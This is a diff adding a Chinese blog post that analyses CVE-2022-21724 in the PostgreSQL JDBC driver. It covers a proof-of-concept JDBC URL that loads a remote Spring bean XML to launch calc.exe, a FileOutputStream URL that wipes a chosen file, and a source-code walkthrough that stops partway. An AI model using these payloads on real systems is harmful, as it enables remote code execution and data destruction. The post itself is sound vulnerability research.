@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="PostgreSQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PostgreSQL">
+<meta property="og:url" content="https://baicany.github.io/2023/10/27/PostgresQL/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="PostgreSQL">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baicany.github.io/images/image-20231029230416814.png">
+<meta property="og:image" content="https://baicany.github.io/images/image-20231029230431095.png">
+<meta property="article:published_time" content="2023-10-27T18:16:01.000Z">
+<meta property="article:modified_time" content="2023-11-08T09:19:40.188Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baicany.github.io/images/image-20231029230416814.png">
+
+
+<link rel="canonical" href="https://baicany.github.io/2023/10/27/PostgresQL/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/10/27/PostgresQL/","path":"2023/10/27/PostgresQL/","title":"PostgreSQL"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PostgreSQL | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PostgreSQL-JDBC-CVE-2022-21724"><span class="nav-number">1.</span> <span class="nav-text">PostgreSQL JDBC(CVE-2022-21724)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-socketFactory-socketFactoryArg"><span class="nav-number">1.3.</span> <span class="nav-text">任意代码执行 socketFactory&#x2F;socketFactoryArg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E2%BE%8F-sslfactory-sslfactoryarg"><span class="nav-number">1.4.</span> <span class="nav-text">任意代码执⾏ sslfactory&#x2F;sslfactoryarg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E5%86%99%E2%BC%8A-loggerLevel-loggerFile"><span class="nav-number">1.5.</span> <span class="nav-text">任意⽂件写⼊ loggerLevel&#x2F;loggerFile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.6.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/10/27/PostgresQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PostgreSQL | baicany">
+      <meta itemprop="description" content="PostgreSQL">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PostgreSQL
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-28 02:16:01" itemprop="dateCreated datePublished" datetime="2023-10-28T02:16:01+08:00">2023-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-08 17:19:40" itemprop="dateModified" datetime="2023-11-08T17:19:40+08:00">2023-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">PostgreSQL</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="PostgreSQL-JDBC-CVE-2022-21724"><a href="#PostgreSQL-JDBC-CVE-2022-21724" class="headerlink" title="PostgreSQL JDBC(CVE-2022-21724)"></a>PostgreSQL JDBC(CVE-2022-21724)</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 <code>authenticationPluginClassName</code>、<code>sslhostnameverifier</code>、<code>socketFactory</code> 、<code>sslfactory</code>、<code>sslpasswordcallback</code> 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。</p>
+<p>影响范围：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="number">9.4</span><span class="number">.1208</span> &lt;=PgJDBC &lt;<span class="number">42.2</span><span class="number">.25</span></span><br><span class="line">　　<span class="number">42.3</span><span class="number">.0</span> &lt;=PgJDBC &lt; <span class="number">42.3</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>添加依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">42.3</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt; </span><br><span class="line">    &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">5.3</span><span class="number">.23</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编写测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sql</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/bean.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>bean.xml</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xmlns:p=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">&lt;!--    普通方式创建类--&gt;</span><br><span class="line">   &lt;bean id=<span class="string">&quot;exec&quot;</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> init-method=<span class="string">&quot;start&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;calc.exe&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="任意代码执行-socketFactory-socketFactoryArg"><a href="#任意代码执行-socketFactory-socketFactoryArg" class="headerlink" title="任意代码执行 socketFactory&#x2F;socketFactoryArg"></a>任意代码执行 socketFactory&#x2F;socketFactoryArg</h2><p>org.postgresql.Driver#connect⽅法最后调⽤了makeConnection⽅法,⽅法实例化了⼀个PgConnection对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Connection <span class="title function_">makeConnection</span><span class="params">(String url, Properties props)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PgConnection</span>(hostSpecs(props), user(props), database(props), props, url);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进这个对象的构造⽅法，其中会调⽤ConnectionFactory.openConnection⽅法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.queryExecutor = ConnectionFactory.openConnection(hostSpecs, user, database, info);</span><br></pre></td></tr></table></figure>
+
+<p>跟进openConnection⽅法，会实例化⼀个ConnectionFactoryImpl，然后调⽤它的openConnectionImpl⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectionFactoryImpl</span>();</span><br><span class="line"><span class="type">QueryExecutor</span> <span class="variable">queryExecutor</span> <span class="operator">=</span> connectionFactory.openConnectionImpl(hostSpecs, user, database, info);</span><br></pre></td></tr></table></figure>
+
+<p>调⽤了SocketFactoryFactory.getSocketFactory⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SocketFactory</span> <span class="variable">socketFactory</span> <span class="operator">=</span> SocketFactoryFactory.getSocketFactory(info);</span><br></pre></td></tr></table></figure>
+
+<p>跟进getSocketFactory⽅法</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SocketFactory getSocketFactory(Properties info) throws PSQLException &#123;</span><br><span class="line">    <span class="keyword">String</span> socketFactoryClassName = PGProperty.SOCKET_FACTORY.<span class="keyword">get</span>(info);</span><br><span class="line">    <span class="keyword">if</span> (socketFactoryClassName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> SocketFactory.getDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (SocketFactory)ObjectFactory.instantiate(socketFactoryClassName, info, <span class="literal">true</span>, PGProperty.SOCKET_FACTORY_ARG.<span class="keyword">get</span>(info));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">PSQLException</span>(GT.tr(<span class="string">&quot;The SocketFactory class provided &#123;0&#125; could not be instantiated.&quot;</span>, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;socketFactoryClassName&#125;), PSQLState.CONNECTION_FAILURE, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>⾸先是socketFactoryClassName的获取，在info中获取socketFactory的值，默认值为nul </p>
+<p>其中info记录着扩展信息，host，数据库名，port等信息，那么可以通过扩展参数设置socketFactory的值 </p>
+<p>我们需要设置socketFactory不为空，以利⽤ObjectFactory.instantiate⽅法，跟进这个⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">instantiate</span><span class="params">(String classname, Properties info, <span class="type">boolean</span> tryString, String stringarg)</span> <span class="keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;info&#125;;</span><br><span class="line">        Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctor = cls.getConstructor(Properties.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tryString &amp;&amp; ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ctor = cls.getConstructor(String.class);</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;stringarg&#125;;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var8) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">            ctor = cls.getConstructor();</span><br><span class="line">            args = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctor.newInstance((Object[])args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这⾥会通过反射实例化classname类名 ,而这里传入的是我们可控的socketFactory</p>
+<p>这⾥tryString为true，我留意到中间的if语句，其中stringarg也可以通过扩展参数进⾏控制,传入的是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGProperty.SOCKET_FACTORY_ARG.get(info)</span><br></pre></td></tr></table></figure>
+
+<p>跟进这个发现,从get()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SOCKET_FACTORY_ARG(<span class="string">&quot;socketFactoryArg&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;Argument forwarded to constructor of SocketFactory class.&quot;</span>),</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 问题就在于我们要实例化哪个类呢？这个类⼜能对web应⽤造成伤害，需要这个类的构造⽅法只有⼀个参数，⽽且参数类型为String</p>
+<ul>
+<li><p>java.io.FileOutputStream类</p>
+<p>对应构造⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">FileOutputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>(name != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">File</span>(name) : <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果指定的⽂件已经存在，并且append设置为false，则⽂件的内容将被清空，并写⼊新的数据。 那么可以利⽤这个类清空⽂件内容</p>
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:5432/baicany?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=/Users/baicany/Desktop/baicany</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>org.springframework.context.support.ClassPathXmlApplicationContext类<br>实例化ClassPathXmlApplicationContext类，可以加载并解析classpath下指定的XML配置⽂件，从⽽创建⼀个包含所有配置的应 ⽤上下⽂。</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String configLocation)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;configLocation&#125;, <span class="literal">true</span>, (ApplicationContext)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用另外一个重载方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="type">boolean</span> refresh, <span class="meta">@Nullable</span> ApplicationContext parent)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="built_in">super</span>(parent);</span><br><span class="line">    <span class="built_in">this</span>.setConfigLocations(configLocations);</span><br><span class="line">    <span class="keyword">if</span> (refresh) &#123;</span><br><span class="line">        <span class="built_in">this</span>.refresh();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在refresh⽅法中，会调⽤obtainFreshBeanFactory⽅法，该⽅法内⼜会调⽤refreshBeanFactory⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConfigurableListableBeanFactory <span class="title function_">obtainFreshBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.refreshBeanFactory();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getBeanFactory();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进refreshBeanFactory</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">DefaultListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="built_in">this</span>.createBeanFactory();</span><br><span class="line">    beanFactory.setSerializationId(<span class="built_in">this</span>.getId());</span><br><span class="line">    <span class="built_in">this</span>.customizeBeanFactory(beanFactory);</span><br><span class="line">    <span class="built_in">this</span>.loadBeanDefinitions(beanFactory);</span><br><span class="line">    <span class="built_in">this</span>.beanFactory = beanFactory;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>调⽤loadBeanDefinitions⽅法，会⼀直调⽤到AbstractXmlApplicationContext#loadBeanDefinitions⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(XmlBeanDefinitionReader reader)</span> <span class="keyword">throws</span> BeansException, IOException &#123;</span><br><span class="line">    Resource[] configResources = <span class="built_in">this</span>.getConfigResources();</span><br><span class="line">    <span class="keyword">if</span> (configResources != <span class="literal">null</span>) &#123;</span><br><span class="line">        reader.loadBeanDefinitions(configResources);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] configLocations = <span class="built_in">this</span>.getConfigLocations();</span><br><span class="line">    <span class="keyword">if</span> (configLocations != <span class="literal">null</span>) &#123;</span><br><span class="line">        reader.loadBeanDefinitions(configLocations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
